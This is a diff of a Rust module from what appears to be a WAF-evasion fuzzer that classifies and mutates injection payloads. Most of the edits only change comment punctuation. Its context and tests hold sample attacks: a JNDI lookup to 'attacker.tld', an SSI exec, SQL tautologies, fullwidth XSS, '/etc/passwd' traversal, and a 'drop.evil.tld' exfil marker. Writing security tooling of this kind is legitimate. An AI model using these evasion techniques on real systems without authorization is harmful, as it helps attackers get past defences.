@@ -31,13 +31,13 @@
 //! └─────────────┘
 //! ```
 //!
-//! # Two mutation engines (intentional split — do NOT merge)
+//! # Two mutation engines (intentional split, do NOT merge)
 //!
 //! This crate ships two grammar-mutation engines with **different jobs**.
 //! They look similar (both touch SQL/XSS/CMD/SSRF notation) but are not
 //! redundant; folding one into the other regresses real capability.
 //!
-//! * **`<class>::mutate` (this module's `mutate`/`mutate_as`)** — the broad
+//! * **`<class>::mutate` (this module's `mutate`/`mutate_as`)**: the broad
 //!   *same-class fuzzer*. It emits many *different-target* / different-shape
 //!   payloads (e.g. SSRF rotates in loopback, cloud-metadata, and rebinding
 //!   hosts regardless of the input host) to maximise the chance that *some*
@@ -45,7 +45,7 @@
 //!   soundness oracle because the variants deliberately are not the same
 //!   attack. Used by `scan`'s exploration pass. Variant lists are Tier-B data
 //!   under `rules/<class>/` (e.g. `rules/ssrf/mutate_variants.toml`).
-//! * **`equiv::<class>::generate`** — the sound *same-attack* engine. Every
+//! * **`equiv::<class>::generate`**: the sound *same-attack* engine. Every
 //!   variant is an oracle-verified semantic equivalent of the operator's
 //!   exact payload (`equiv::<class>::still_*`), and it carries `DeliveryShape`
 //!   transport bypasses. Used by `distill`, `bench`, and `scan`'s flagship
@@ -54,7 +54,7 @@
 //! Concretely: `ssrf::mutate` emitting `http://2130706433` (fixed loopback as
 //! integer) is fuzzer data; `equiv::ssrf::rw_ip_form` re-encoding the
 //! *payload's own* host integer into a random `inet_aton` form is a
-//! target-preserving rewrite. Same notation, different operation — sharing the
+//! target-preserving rewrite. Same notation, different operation, sharing the
 //! code would change what the fuzzer emits.
 
 // §8 ARCHITECTURE: visibility narrowing.
@@ -69,7 +69,7 @@ pub mod cmd;
 pub mod cmd_windows;
 pub mod elastic;
 pub mod equiv;
-// jndi: no integration-test users — internal dispatch target only.
+// jndi: no integration-test users (internal dispatch target only).
 pub mod bestfit;
 pub(crate) mod homoglyph_gen;
 pub(crate) mod jndi;
@@ -80,14 +80,14 @@ pub mod path_traversal;
 pub mod polyglot;
 pub mod redis;
 pub mod sql;
-// ssi: no integration-test users — internal dispatch target only.
+// ssi: no integration-test users (internal dispatch target only).
 pub(crate) mod ssi;
 pub mod ssrf;
 pub mod template;
 // unicode_norm: forward NFKC-fold + fullwidth detection for the classifier
 // (detect_fullwidth/nfkc_fold_ascii) and the bench keyword oracle
 // (reachable_keywords). Reverse homoglyph *generation* lives solely in
-// nfkc_preimage (NO-DUP) — this module no longer mints bypass variants.
+// nfkc_preimage (NO-DUP) (this module no longer mints bypass variants).
 pub(crate) mod unicode_norm;
 // variant_util: shared no-op-drop + dedup for the NoSQL mutators (§7 DEDUP).
 pub(crate) mod variant_util;
@@ -97,7 +97,7 @@ pub mod xss;
 //
 // The classifier needs at least this many independent signals before committing
 // to a class. A threshold of 1 means a single signal (e.g. a bare `select`)
-// is enough — this is intentionally low because the downstream mutators handle
+// is enough, this is intentionally low because the downstream mutators handle
 // unknown tokens gracefully; the risk of false-negative (missing a real attack)
 // outweighs the risk of false-positive (wrong mutator applied). Raising this
 // value will cause more payloads to fall through to `Unknown`.
@@ -154,7 +154,7 @@ pub enum PayloadType {
     /// Targets log4j's recursive lookup-substitution engine via
     /// `${jndi:ldap://…}` and obfuscated variants.
     Jndi,
-    /// Unknown — not clearly one of the above.
+    /// Unknown (not clearly one of the above).
     Unknown,
 }
 
@@ -262,12 +262,12 @@ impl Default for MutationRequest {
 /// Classify a payload as SQL injection, XSS, or command injection.
 ///
 /// Uses heuristic keyword matching. The classifier errs on the side of
-/// returning `Unknown` rather than misclassifying — a misclassification
+/// returning `Unknown` rather than misclassifying, a misclassification
 /// would apply wrong grammar rules and produce broken payloads.
 #[must_use]
 pub fn classify(payload: &str) -> PayloadType {
     // Short-circuit on SSI's unambiguous `<!--#…-->` envelope BEFORE
-    // signal counting — otherwise the `=` and quoted-string in
+    // signal counting, otherwise the `=` and quoted-string in
     // `cmd="ls"` trips the SQL detector. SSI's envelope is exclusive
     // to Apache mod_include, no other attack class uses it.
     if ssi::detect_type(payload) {
@@ -275,7 +275,7 @@ pub fn classify(payload: &str) -> PayloadType {
     }
 
     // Short-circuit on JNDI/Log4Shell `${jndi:…}` envelope BEFORE signal
-    // counting — the `${` syntax would otherwise trip the template-injection
+    // counting, the `${` syntax would otherwise trip the template-injection
     // detector, and the `://` in the URL body would confuse the SSRF detector.
     // JNDI's outer envelope is unambiguous (no other class uses `${jndi:`).
     if jndi::detect_type(payload) {
@@ -287,7 +287,7 @@ pub fn classify(payload: &str) -> PayloadType {
     // and zero-width chars before the keyword scan. Pre-fix a
     // payload like "SELECT\u{202E}1" was classified as Unknown
     // because the inserted RTL override broke the substring match
-    // of "select" — operator's "SQL" intent silently became
+    // of "select", operator's "SQL" intent silently became
     // generic-class mutations. Strip these so the classifier sees
     // the intended characters.
     let scrubbed: String = payload
@@ -314,7 +314,7 @@ pub fn classify(payload: &str) -> PayloadType {
 
     let lower = scrubbed.to_ascii_lowercase();
 
-    // SQL indicators (weighted — require multiple signals)
+    // SQL indicators (weighted, require multiple signals)
     let sql_signals: u32 = [
         lower.contains("select"),
         lower.contains("union"),
@@ -413,7 +413,7 @@ pub fn classify(payload: &str) -> PayloadType {
         PayloadType::Xss
     } else if cmd_signals >= CLASSIFY_CMD_MIN_SIGNALS {
         // Before accepting CMDi, check if this is actually path traversal.
-        // A bare "../../../etc/passwd" has no shell separator — it's LFI, not CMDi.
+        // A bare "../../../etc/passwd" has no shell separator (it's LFI, not CMDi).
         // CMDi requires at least one separator-triggered signal (;, |, &&, ||, `, $()
         // or ${IFS}). If the only match is /etc/passwd or /bin/ without a separator,
         // it's path traversal. `has_separator_signal` was computed above.
@@ -425,7 +425,7 @@ pub fn classify(payload: &str) -> PayloadType {
         } else {
             // Pre-fix this fell through to CommandInjection even with no
             // separator. A bare `/etc/passwd` or `/bin/ls` token is path
-            // disclosure / LFI, not command injection — without `; | &
+            // disclosure / LFI, not command injection, without `; | &
             // && || $() ` `${IFS}` we cannot claim the shell was reached.
             // Try the remaining specific types before defaulting.
             if ssi::detect_type(payload) {
@@ -449,7 +449,7 @@ pub fn classify(payload: &str) -> PayloadType {
             }
         }
     } else {
-        // No core type match — check extended types. SSI's
+        // No core type match, check extended types. SSI's
         // `<!--#…-->` envelope is unambiguous, so it goes first.
         // JNDI check follows: `${jndi:` is unambiguous and must
         // not be aliased to TemplateInjection (which also uses `${`).
@@ -480,7 +480,7 @@ pub fn classify(payload: &str) -> PayloadType {
 /// Check if a string contains a common shell command as a whole token.
 ///
 /// Pre-fix this used `.contains()` substring matching, so short command
-/// names like `id` and `nc` matched as substrings inside ordinary words —
+/// names like `id` and `nc` matched as substrings inside ordinary words 
 /// `consider`, `validate`, `android`, `since`, `concert`. The classifier
 /// would then mis-route benign text as command injection.
 fn contains_shell_command(s: &str) -> bool {
@@ -547,8 +547,8 @@ fn contains_shell_command(s: &str) -> bool {
 /// or `cmd::mutate` functions directly.
 ///
 /// # Arguments
-/// * `payload` — The injection payload to mutate
-/// * `max_mutations` — Maximum number of variants to generate
+/// * `payload`: The injection payload to mutate
+/// * `max_mutations`: Maximum number of variants to generate
 #[must_use]
 pub fn mutate(payload: &str, max_mutations: usize) -> Vec<GrammarMutation> {
     let payload_type = classify(payload);
@@ -569,7 +569,7 @@ pub fn mutate_request(
     match request.diversity {
         DiversityPolicy::Random => base,
         DiversityPolicy::CoverageGuided => {
-            // §1 SPEED: key directly on Vec<&'static str> (Hash+Eq) — avoids
+            // §1 SPEED: key directly on Vec<&'static str> (Hash+Eq), avoids
             // allocating a joined String per candidate compared to join(",").
             let mut seen: std::collections::HashSet<Vec<&'static str>> =
                 std::collections::HashSet::new();
@@ -633,7 +633,7 @@ pub fn mutate_as(
 
             // §11 UTILIZATION: wire CfgMutator (BWAFSQLi convergence-annealing
             // grammar) into the SQL mutation pipeline. This was previously a
-            // complete implementation with zero production callers — a §11 dead
+            // complete implementation with zero production callers, a §11 dead
             // code violation. We emit a small number of CFG-guided variants using
             // canonical SQL injection templates so the convergence machinery is
             // actually reachable from `wafrift evade`/`scan`/`bench-waf`.
@@ -644,7 +644,7 @@ pub fn mutate_as(
             // boolean-AND, and terminator-comment. The seed is deterministic so
             // identical inputs produce identical outputs (oracle soundness).
             // Leave NORM_DIFFERENTIAL_RESERVE slots for the normalization block
-            // below — the CFG sampler is greedy and otherwise fills the entire
+            // below, the CFG sampler is greedy and otherwise fills the entire
             // budget (dogfood: SQL `evade` emitted zero best-fit/NFKC forms).
             let cfg_ceiling = max_mutations.saturating_sub(NORM_DIFFERENTIAL_RESERVE);
             if results.len() < cfg_ceiling {
@@ -682,7 +682,7 @@ pub fn mutate_as(
                     .collect();
                 'outer: for _ in 0..budget {
                     // Once converged, all further expansions are deterministic
-                    // (same highest-score production fires every time) — no
+                    // (same highest-score production fires every time), no
                     // new unique variants possible. Stop early.
                     if mutator.is_converged() {
                         break;
@@ -802,7 +802,7 @@ pub fn mutate_as(
                     .map(|(&t, &l)| (t, l))
                     .collect();
                 'xss_outer: for _ in 0..budget {
-                    // Once converged, further expansions are deterministic —
+                    // Once converged, further expansions are deterministic 
                     // break to avoid emitting identical duplicates.
                     if mutator.is_converged() {
                         break;
@@ -835,7 +835,7 @@ pub fn mutate_as(
             // Unicode normalization-differential mutations: WAFs normalising
             // to NFC miss fullwidth/math-bold forms; NFKC-capable back-ends
             // reconstruct the attack. Add these as additional XSS variants.
-            // §12 TESTING: validate with still_executes_xss before adding —
+            // §12 TESTING: validate with still_executes_xss before adding 
             // fullwidth Unicode normalisation doesn't preserve structured
             // exfil markers (//drop.evil.tld/) in the oracle's normaliser, so
             // those variants must not escape into the output for structured
@@ -843,8 +843,8 @@ pub fn mutate_as(
             if results.len() < max_mutations {
                 // nfkc_preimage: the complete inverse-NFKC homoglyph set (every
                 // codepoint Unicode folds to ASCII), generated via style-pass,
-                // single-codepoint, and alternating strategies — which strictly
-                // subsume the former hand-rolled fullwidth/math/mixed styles —
+                // single-codepoint, and alternating strategies, which strictly
+                // subsume the former hand-rolled fullwidth/math/mixed styles 
                 // each gated by NFKC(variant)==payload.
                 let norm_variants = nfkc_preimage::variants(payload, 24)
                     .into_iter()
@@ -947,7 +947,7 @@ pub fn mutate_as(
                 let norm = nfkc_preimage::variants(payload, budget)
                     .into_iter()
                     // layered: `%E2%80%A5` (percent-encoded U+2025 dot-leader)
-                    // — a WAF that url-decodes but doesn't NFKC, or NFKCs but
+                    //: a WAF that url-decodes but doesn't NFKC, or NFKCs but
                     // doesn't url-decode, sees no `../`; the origin doing both
                     // reconstructs the path.
                     .chain(nfkc_preimage::composed_variants(payload, budget / 2 + 1));
@@ -1196,7 +1196,7 @@ pub fn mutate_as_with_state(
             results.truncate(max_mutations);
             results
         }
-        // Non-CFG types fall back to stateless mutate_as — no state is
+        // Non-CFG types fall back to stateless mutate_as, no state is
         // consumed for these payload classes.
         other => mutate_as(payload, other, max_mutations),
     }
@@ -1333,7 +1333,7 @@ mod tests {
         for m in &sql {
             // Tautology mutations should have CHANGED something
             // (Note: some tautologies like IIF(1=1,1,0) contain "1=1"
-            // as a substring, which is fine — the structure is different)
+            // as a substring, which is fine, the structure is different)
             if m.rules_applied.contains(&"tautology_swap") {
                 assert_ne!(
                     m.payload, "' OR 1=1--",
@@ -1346,7 +1346,7 @@ mod tests {
 
     #[test]
     fn high_volume_does_not_panic() {
-        // Stress test: request many mutations — covers all payload types
+        // Stress test: request many mutations, covers all payload types
         // including the CFG-convergence wiring paths. §12 TESTING: every
         // new wiring path that can panic (OOM, unwrap, array index) must
         // be exercised under load.
@@ -1363,7 +1363,7 @@ mod tests {
         let _ = mutate_as("{$ne:null}", PayloadType::NoSql, 500);
         let _ = mutate_as("<!--#exec cmd=\"id\"-->", PayloadType::Ssi, 500);
         let _ = mutate_as("${jndi:ldap://attacker.tld/a}", PayloadType::Jndi, 500);
-        // Unknown falls through to multi-class fan-out — must not panic
+        // Unknown falls through to multi-class fan-out, must not panic
         let _ = mutate_as("hello world", PayloadType::Unknown, 500);
         // Adversarial: control bytes, multibyte, empty, max-len
         let _ = mutate("\x00\x01\x02\x03OR 1=1", 100);
@@ -1500,9 +1500,9 @@ mod tests {
     }
 
     /// LAW 1 anti-rig: plain HTML comments without the SSI `#` are
-    /// NOT classified as SSI. (Other classifiers may pick them up —
+    /// NOT classified as SSI. (Other classifiers may pick them up 
     /// Pug declares `- ` as a delimiter for inline JS, which `<!-- `
-    /// contains — but the bug we're guarding against is SSI's
+    /// contains, but the bug we're guarding against is SSI's
     /// classify_ssi short-circuit accidentally claiming non-SSI
     /// markup.)
     #[test]
@@ -1685,7 +1685,7 @@ mod tests {
     // ── §11 UTILIZATION: CFG convergence-annealing wiring tests ──────────────
     // Pin that CfgMutator is reachable from the public `mutate` / `mutate_as`
     // API surface. Pre-fix CfgMutator was a complete implementation with zero
-    // production callers — an §11 dead-code violation caught by audit.
+    // production callers (an §11 dead-code violation caught by audit).
 
     #[test]
     fn sql_mutations_include_cfg_convergence_variants() {
@@ -1750,12 +1750,12 @@ mod tests {
 
     // ── §3 CAPABILITY: fullwidth Unicode classification ────────────────────────
     // Fullwidth-obfuscated payloads (e.g. `ａlert(1)`) must classify
-    // correctly — pre-fix they fell to Unknown because the keyword scan
+    // correctly, pre-fix they fell to Unknown because the keyword scan
     // matched on ASCII and fullwidth chars are different codepoints.
 
     #[test]
     fn classify_fullwidth_xss_is_not_unknown() {
-        // Fullwidth 'a' (U+FF41): `ａlert(1)` — WAF evasion by Unicode trick.
+        // Fullwidth 'a' (U+FF41): `ａlert(1)`: WAF evasion by Unicode trick.
         // After nfkc_fold_ascii the classifier sees `alert(1)`.
         // The payload still needs a tag context to be classified as XSS.
         let fw_xss = "<img src=x onerror=\u{FF41}lert(1)>";
@@ -1769,7 +1769,7 @@ mod tests {
 
     #[test]
     fn classify_fullwidth_sql_is_not_unknown() {
-        // Fullwidth 'S' (U+FF33) etc. — `ＳＥＬＥＣＴ * FROM users`
+        // Fullwidth 'S' (U+FF33) etc.: `ＳＥＬＥＣＴ * FROM users`
         let fw_sql = "\u{FF33}\u{FF25}\u{FF2C}\u{FF25}\u{FF23}\u{FF34} * FROM users";
         assert_eq!(
             classify(fw_sql),
@@ -1921,7 +1921,7 @@ mod tests {
         // Rules without "cfg_" prefix must not cause panics or state corruption.
         use crate::grammar::cfg_convergence::CfgMutatorState;
         let mut state = CfgMutatorState::new();
-        // These are non-CFG rules — feedback must silently skip them.
+        // These are non-CFG rules (feedback must silently skip them).
         feedback(
             &mut state,
             PayloadType::Sql,
